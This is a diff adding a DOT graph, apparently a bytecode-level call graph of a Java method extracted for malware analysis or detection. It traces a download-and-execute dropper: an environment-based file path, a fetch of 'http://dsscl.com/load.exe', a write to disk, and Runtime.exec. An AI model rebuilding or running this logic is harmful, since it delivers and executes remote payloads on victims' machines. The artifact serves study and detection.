@@ -1,0 +1,28 @@
+digraph "" {
+"new java.lang.StringBuilder";
+ "new java.lang.StringBuilder"->"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+ "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+ "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+ "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+ "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"new java.io.BufferedInputStream";
+ "new java.io.BufferedInputStream"->"new java.net.URL";
+ "new java.net.URL"->"push 'http://dsscl.com/load.exe'";
+ "push 'http://dsscl.com/load.exe'"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+ "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.io.InputStream openStream()>";
+ "virtualinvoke <java.net.URL: java.io.InputStream openStream()>"->"specialinvoke <java.io.BufferedInputStream: void <init>(java.io.InputStream)>";
+ "specialinvoke <java.io.BufferedInputStream: void <init>(java.io.InputStream)>"->"new java.io.FileOutputStream";
+ "new java.io.FileOutputStream"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+ "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"new java.io.BufferedOutputStream";
+ "new java.io.BufferedOutputStream"->"specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream,int)>";
+ "specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream,int)>"->"goto load.r r0";
+ "goto load.r r0"->"virtualinvoke <java.io.BufferedInputStream: int read(byte[])>";
+ "virtualinvoke <java.io.BufferedInputStream: int read(byte[])>"->"virtualinvoke <java.io.BufferedOutputStream: void close()>";
+ "virtualinvoke <java.io.BufferedOutputStream: void close()>"->"virtualinvoke <java.io.BufferedInputStream: void close()>";
+ "virtualinvoke <java.io.BufferedInputStream: void close()>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+ "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+ "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"goto return";
+ "goto return"->"return";
+ "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"virtualinvoke <java.io.IOException: void printStackTrace()>";
+"virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>";
+}
